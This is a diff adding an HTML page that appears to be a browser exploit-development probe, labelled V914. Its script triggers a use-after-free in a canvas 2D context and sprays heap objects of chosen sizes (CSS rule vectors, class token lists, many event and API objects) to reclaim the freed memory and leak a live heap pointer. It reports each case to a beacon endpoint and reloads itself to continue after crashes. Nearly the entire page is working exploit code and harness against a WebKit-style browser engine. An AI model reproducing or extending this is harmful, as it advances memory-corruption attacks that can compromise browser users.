@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V914 - class census: pointer-at-+112 candidates</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:11px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; vertical-align:top; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+  .skip { color:#d29922; }
+  .hit { color:#ffa657; font-weight:bold; }
+  .bad { color:#ff7b72; font-weight:bold; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V914 - Class census (pointer-at-+112 candidates)</h1>
+
+<p class="key">
+<b>Goal:</b> every V907-V911 hit was a <b>data buffer</b> (pixels/chars) — so slot +112 held zeros or
+characters = crash. What we still need is an allocation whose <b>byte 112-119 is a live heap pointer</b>.
+<b>Allocator math:</b> the 768B class serves ~705-768 byte allocations (text-704 StringImpl ~729 crashed;
+imagedata 704 exact missed; text-768 ~793 missed). A <code>Vector<RefPtr></code> at WTF capacity ~89-96
+is 712-768 bytes, and +112 lands exactly on element 14's RefPtr → deref +48 reads inside a live C++ object
+= <b>SUSPECT = leak</b>. rules64 (cap 61 = 488B) and rules256 (cap 139 = 1112B) both MISS — consistent;
+<b>rules ~92</b> (cap 92 = 736B) was never tested. Also classList (~90 tokens → SpaceSplitStringData
+exact-size) and MediaQueryExp vectors. Plus a rich-object census (events with RefPtr inits, Request/Response,
+observers, Intl).
+<b>Controls:</b> <code>same-none</code> must MISS; <code>imagedata-16x12</code>/<code>abzero</code> must CRASH.
+A <code>SUSPECT</code> is followed by 4 extra reads (ml/ga/ldo/sb + hex).
+</p>
+
+<p>
+Start: <b>?op=auto</b> &nbsp;|&nbsp; one case: <b>?case=rules-92</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+<br>After a crash just reopen <b>?op=auto</b>. Done when the page prints <b>ALL CASES DONE</b>.
+</p>
+
+<h2>Cases (46)</h2>
+<pre>
+#0      same-none (control: MISS)
+#1-7    rules 64/70/76/82/88/94/100 (Vector<RefPtr<CSSRule>> capacity sweep)
+#8-11   toklist 86/90/94/98 (SpaceSplitStringData exact-size, AtomicString ptrs)
+#12-15  mmcl 16/20/24/28 (MediaQueryExp vectors)
+#16-33  rich events x18 (CustomEvent/MessageEvent/PopState/Storage/Mouse/Keyboard/...)
+#34-43  misc x10 (CSSStyleSheet/MediaSource/Request/Response/IO/PerfObs/Animation/VTTCue/DOMMatrix/BroadcastChannel)
+#44-45  controls imagedata-16x12, abzero (must CRASH)
+</pre>
+
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+
+<p class="note">Previous runs: V912 recon (no anchor), V913 tee-nonce (self-data only, tee closed). All leak avenues closed except targeted class selection — this probe tests the allocator-math candidates.</p>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v914_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v914_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v914_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V914-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+function hexOf(x) { var f = new Float64Array(1), u = new Uint32Array(f.buffer); f[0] = x; return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8); }
+function stLast(id, stage) { try { lsSet('last', id + ':' + stage); } catch (e) {} }
+
+/* ---------- UAF trigger (V680-style, 32 saves) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- builders ---------- */
+var KEEP = null;
+function buildEntry(e, helper, helperCanvas) {
+  var t = e.t, n = e.n, a = e.a, out = [], i, j;
+  if (t === 'none') {
+    out = [];
+  } else if (t === 'rules') {
+    var se = document.createElement('style');
+    document.head.appendChild(se);
+    var sh = se.sheet;
+    for (j = 0; j < a; j++) {
+      try { sh.insertRule('.r' + j + '{color:rgb(' + (j & 255) + ',0,0)}', sh.cssRules.length); } catch (e9) {}
+    }
+    out = [se, sh];
+  } else if (t === 'toklist') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var td = document.createElement('div');
+      var s = '';
+      for (j = 0; j < a; j++) s += 'tk' + j + ' ';
+      try { td.className = s; } catch (e10) {}
+      out[i] = td;
+    }
+  } else if (t === 'mmclauses') {
+    var qs = '(min-width: 1px)';
+    for (j = 1; j < a; j++) qs += ' and (max-width: ' + (500 + j) + 'px)';
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = window.matchMedia(qs); } catch (e11) { out[i] = null; }
+    }
+  } else if (t === 'ctor') {
+    var fn = CTORS[a];
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = fn(i); } catch (e12) { out[i] = null; }
+    }
+  } else if (t === 'imagedata') {
+    var wh = String(a).split('x');
+    var w = parseInt(wh[0], 10), h = parseInt(wh[1], 10);
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = helper.createImageData(w, h); } catch (e4) { out[i] = null; }
+    }
+  } else if (t === 'abzero') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = new ArrayBuffer(768);
+  }
+  KEEP = out;
+  return out;
+}
+
+/* ---------- rich-object constructors ---------- */
+var CTORS = {
+  'ev-event':        function () { return new Event('e'); },
+  'ev-ui':           function () { return new UIEvent('u', { detail: 1, view: window }); },
+  'ev-focus':        function () { return new FocusEvent('f', { relatedTarget: document.body }); },
+  'ev-mouse':        function () { return new MouseEvent('m', { clientX: 1, clientY: 2, screenX: 3, screenY: 4, button: 0, buttons: 1, relatedTarget: document.body, view: window }); },
+  'ev-pointer':      function () { return new PointerEvent('p', { pointerId: 1, pointerType: 'mouse', clientX: 5, clientY: 6, isPrimary: true }); },
+  'ev-wheel':        function () { return new WheelEvent('w', { deltaX: 1, deltaY: 2, deltaZ: 0, deltaMode: 0 }); },
+  'ev-drag':         function () { return new DragEvent('d'); },
+  'ev-clipboard':    function () { return new ClipboardEvent('c'); },
+  'ev-keyboard':     function () { return new KeyboardEvent('k', { key: 'a', code: 'KeyA', keyCode: 65, charCode: 97, location: 1, repeat: false }); },
+  'ev-composition':  function () { return new CompositionEvent('c', { data: 'xy' }); },
+  'ev-input':        function () { return new InputEvent('i', { data: 'x', inputType: 'insertText', isComposing: false }); },
+  'ev-custom':       function () { return new CustomEvent('c', { detail: { d: 1, e: 2 } }); },
+  'ev-message':      function () { return new MessageEvent('m', { data: { d: 1 }, origin: 'https://x', lastEventId: '1', source: window }); },
+  'ev-popstate':     function () { return new PopStateEvent('p', { state: { d: 1 } }); },
+  'ev-storage':      function () { return new StorageEvent('s', { key: 'k', oldValue: 'a', newValue: 'b', url: 'https://x', storageArea: null }); },
+  'ev-promise':      function () { return new PromiseRejectionEvent('p', { promise: Promise.resolve(1), reason: 'r' }); },
+  'ev-progress':     function () { return new ProgressEvent('p', { lengthComputable: true, loaded: 10, total: 20 }); },
+  'ev-error':        function () { return new ErrorEvent('e', { message: 'm', filename: 'f', lineno: 1, colno: 2, error: new Error('x') }); },
+  'ev-close':        function () { return new CloseEvent('c', { wasClean: true, code: 1000, reason: 'r' }); },
+  'ev-hashchange':   function () { return new HashChangeEvent('h', { oldURL: 'https://a', newURL: 'https://b' }); },
+  'ev-pagetrans':    function () { return new PageTransitionEvent('p', { persisted: true }); },
+  'ev-animation':    function () { return new AnimationEvent('a', { animationName: 'n', elapsedTime: 1.5, pseudoElement: '' }); },
+  'ev-transition':   function () { return new TransitionEvent('t', { propertyName: 'opacity', elapsedTime: 1.5, pseudoElement: '' }); },
+  'misc-csssheet':   function () { try { return new CSSStyleSheet(); } catch (e) { return document.createElement('style').sheet; } },
+  'misc-ms':         function () { return new MediaSource(); },
+  'misc-request':    function () { return new Request('https://x/'); },
+  'misc-response':   function () { return new Response('body'); },
+  'misc-io':         function () { return new IntersectionObserver(function () {}); },
+  'misc-po':         function () { return new PerformanceObserver(function () {}); },
+  'misc-anim':       function () { try { return new Animation(); } catch (e) { return null; } },
+  'misc-vttcue':     function () { return new VTTCue(0, 1, 'x'); },
+  'misc-dommatrix':  function () { try { return new DOMMatrix(); } catch (e) { try { return new WebKitCSSMatrix(); } catch (e2) { return null; } } },
+  'misc-bc':         function () { try { return new BroadcastChannel('c' + Math.floor(Math.random() * 4)); } catch (e) { return null; } }
+};
+
+/* 24 tagged real contexts, V680 detector */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+
+/* ---------- table ---------- */
+var TABLE = [];
+function add(id, t, n, a, saves) { TABLE.push({ id: id, t: t, n: n, a: a, saves: saves }); }
+add('same-none', 'none', 0, 0, 32);
+add('rules-64', 'rules', 1, 64, 32);
+add('rules-70', 'rules', 1, 70, 32);
+add('rules-76', 'rules', 1, 76, 32);
+add('rules-82', 'rules', 1, 82, 32);
+add('rules-88', 'rules', 1, 88, 32);
+add('rules-94', 'rules', 1, 94, 32);
+add('rules-100', 'rules', 1, 100, 32);
+add('toklist-86', 'toklist', 24, 86, 32);
+add('toklist-90', 'toklist', 24, 90, 32);
+add('toklist-94', 'toklist', 24, 94, 32);
+add('toklist-98', 'toklist', 24, 98, 32);
+add('mmcl-16', 'mmclauses', 16, 16, 32);
+add('mmcl-20', 'mmclauses', 16, 20, 32);
+add('mmcl-24', 'mmclauses', 16, 24, 32);
+add('mmcl-28', 'mmclauses', 16, 28, 32);
+add('ev-event', 'ctor', 24, 'ev-event', 32);
+add('ev-ui', 'ctor', 24, 'ev-ui', 32);
+add('ev-focus', 'ctor', 24, 'ev-focus', 32);
+add('ev-mouse', 'ctor', 24, 'ev-mouse', 32);
+add('ev-pointer', 'ctor', 24, 'ev-pointer', 32);
+add('ev-wheel', 'ctor', 24, 'ev-wheel', 32);
+add('ev-drag', 'ctor', 24, 'ev-drag', 32);
+add('ev-clipboard', 'ctor', 24, 'ev-clipboard', 32);
+add('ev-keyboard', 'ctor', 24, 'ev-keyboard', 32);
+add('ev-composition', 'ctor', 24, 'ev-composition', 32);
+add('ev-input', 'ctor', 24, 'ev-input', 32);
+add('ev-custom', 'ctor', 24, 'ev-custom', 32);
+add('ev-message', 'ctor', 24, 'ev-message', 32);
+add('ev-popstate', 'ctor', 24, 'ev-popstate', 32);
+add('ev-storage', 'ctor', 24, 'ev-storage', 32);
+add('ev-promise', 'ctor', 24, 'ev-promise', 32);
+add('ev-progress', 'ctor', 24, 'ev-progress', 32);
+add('ev-error', 'ctor', 24, 'ev-error', 32);
+add('ev-close', 'ctor', 24, 'ev-close', 32);
+add('ev-hashchange', 'ctor', 24, 'ev-hashchange', 32);
+add('ev-pagetrans', 'ctor', 24, 'ev-pagetrans', 32);
+add('ev-animation', 'ctor', 24, 'ev-animation', 32);
+add('ev-transition', 'ctor', 24, 'ev-transition', 32);
+add('misc-csssheet', 'ctor', 24, 'misc-csssheet', 32);
+add('misc-ms', 'ctor', 24, 'misc-ms', 32);
+add('misc-request', 'ctor', 24, 'misc-request', 32);
+add('misc-response', 'ctor', 24, 'misc-response', 32);
+add('misc-io', 'ctor', 24, 'misc-io', 32);
+add('misc-po', 'ctor', 24, 'misc-po', 32);
+add('misc-anim', 'ctor', 24, 'misc-anim', 32);
+add('misc-vttcue', 'ctor', 24, 'misc-vttcue', 32);
+add('misc-dommatrix', 'ctor', 24, 'misc-dommatrix', 32);
+add('misc-bc', 'ctor', 24, 'misc-bc', 32);
+add('imagedata-16x12', 'imagedata', 16, '16x12', 32);
+add('abzero', 'abzero', 16, 768, 32);
+
+function findEntry(id) { for (var i = 0; i < TABLE.length; i++) if (TABLE[i].id === id) return TABLE[i]; return null; }
+
+/* ---------- cases ---------- */
+function runCase(id) {
+  var e = findEntry(id);
+  if (!e) return { tag: 'SKIP', detail: 'unknown-case' };
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v914canvas = canvas;
+
+  var helperCanvas = document.createElement('canvas');
+  helperCanvas.width = 1; helperCanvas.height = 1;
+  document.body.appendChild(helperCanvas);
+  var helper = null;
+  try { helper = helperCanvas.getContext('2d'); } catch (eH) {}
+  window._v914helper = [helper, helperCanvas];
+
+  var t = trigger(canvas, e.saves);
+  if (!t.saved || !t.bmp) return { tag: 'THROW', detail: 'trigger-failed:inner=' + !!t.saved + ',bmr=' + !!t.bmp };
+  stLast(id, 'S1-trigger');
+
+  var keptLen = 0, berr = null;
+  try { keptLen = buildEntry(e, helper, helperCanvas).length; } catch (eK) { berr = eK.name || 'build-err'; }
+  stLast(id, 'S2-candidate');
+
+  var tk = tagContexts(24);
+  stLast(id, 'S3-tagged');
+
+  var lw = null, le = null;
+  try { lw = t.saved.lineWidth; } catch (er) { le = errOf(er); }
+
+  var base = 't=' + e.t + ',n=' + e.n + ',a=' + e.a + ',saves=' + e.saves + ',kept=' + keptLen + (berr ? ',berr=' + berr : '') + ',made=' + tk.made;
+  if (le) return { tag: 'THROW', detail: base + ',ERR=' + le };
+
+  if (typeof lw === 'number' && lw >= 200 && lw < 200 + tk.made) {
+    return { tag: 'MISS', detail: base + ',lw=' + lw + '(tagged ctx won)' };
+  }
+
+  /* SUSPECT: candidate hit and vector looked readable — read 4 more fields */
+  var extra = '';
+  var names = ['ml', 'ga', 'ldo', 'sb'];
+  var vals = [null, null, null, null];
+  try { vals[0] = t.saved.miterLimit; } catch (e1) { extra += ',ml=ERR:' + errOf(e1); }
+  try { vals[1] = t.saved.globalAlpha; } catch (e2) { extra += ',ga=ERR:' + errOf(e2); }
+  try { vals[2] = t.saved.lineDashOffset; } catch (e3) { extra += ',ldo=ERR:' + errOf(e3); }
+  try { vals[3] = t.saved.shadowBlur; } catch (e4) { extra += ',sb=ERR:' + errOf(e4); }
+  for (var g = 0; g < 4; g++) {
+    if (vals[g] !== null) extra += ',' + names[g] + '=' + vals[g] + ':' + hexOf(vals[g]);
+  }
+  return { tag: 'SUSPECT', detail: base + ',lw=' + lw + ':' + hexOf(lw) + extra };
+}
+
+var SEQUENCE = [];
+for (var qi = 0; qi < TABLE.length; qi++) SEQUENCE.push(TABLE[qi].id);
+
+var EXPECT = {
+  'same-none': 'MISS (control)',
+  'imagedata-16x12': 'CRASH (control)', 'abzero': 'CRASH (control)',
+  'rules-64': 'MISS (V908: cap61=488B)', 'rules-100': 'MISS? (cap>96)'
+};
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(id) { return (lsGet('done') || ';').indexOf(';' + id + ';') >= 0; }
+function markDone(id) { var d = lsGet('done') || ';'; if (d.indexOf(';' + id + ';') < 0) lsSet('done', d + id + ';'); }
+function nextCase() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>case</th><th>expected</th><th>result</th><th>detail</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : (p[1] === 'SUSPECT' ? 'hit' : (p[1] === 'SKIP' ? 'skip' : 'ok'));
+    var det = p[2] || '';
+    var alarm = (p[1] === 'SUSPECT');
+    html += '<tr><td>' + esc(p[0]) + '</td><td>' + esc(EXPECT[p[0]] || '') +
+            '</td><td class="' + cls + '">' + esc(p[1]) + '</td><td' + (alarm ? ' class="bad"' : '') + '>' + esc(det) + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+}
+
+async function runOne(id) {
+  bks('START', 'case=' + id + ',run=' + RUN);
+  lsSet('cur', id);
+  lsSet('last', id + ':S0-enter');
+
+  var r;
+  try { r = runCase(id); }
+  catch (e) { r = { tag: 'THROW', detail: 'harness=' + errOf(e) }; }
+
+  appendRes(id + '|' + r.tag + '|' + (r.detail || ''));
+  markDone(id);
+  lsSet('cur', '');
+  lsSet('last', id + ':S9-done');
+  bks('DONE', 'case=' + id + ',tag=' + r.tag + ',detail=' + (r.detail || '').slice(0, 380));
+  say(id + ' -> ' + r.tag + ' ' + (r.detail || ''));
+  render();
+  return r;
+}
+
+async function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('cur'); lsDel('done'); lsDel('res'); lsDel('last');
+    bks('RESET', 'cleared,run=' + RUN);
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  var cur = lsGet('cur');
+  if (cur) {
+    var last = lsGet('last') || '?';
+    appendRes(cur + '|CRASH|last=' + last);
+    markDone(cur);
+    lsDel('cur');
+    lsDel('last');
+    bks('CRASH-DETECTED', 'case=' + cur + ',last=' + last + ',run=' + RUN);
+    say('previous case CRASHED: ' + cur + ' last=' + last);
+  }
+
+  var m = /[?&]case=([^&]+)/.exec(q);
+  var one = m ? decodeURIComponent(m[1]) : '';
+  var auto = (q.indexOf('op=auto') >= 0) || (!one && q.indexOf('case=') < 0);
+
+  if (one) {
+    var rr = await runOne(one);
+    say('single case done: ' + one + ' -> ' + rr.tag);
+    render();
+    return;
+  }
+
+  if (auto) {
+    var id = nextCase();
+    if (!id) {
+      bks('FINAL', 'run=' + RUN + ',res=' + (lsGet('res') || '').slice(0, 440));
+      say('ALL CASES DONE.');
+      render();
+      return;
+    }
+    await runOne(id);
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 700);
+    return;
+  }
+
+  say('ready. use ?op=auto or ?case=<id>');
+  render();
+}
+
+try { main(); } catch (e) { bks('FATAL', errOf(e)); say('FATAL ' + errOf(e)); }
+</script>
+</body>
+</html>
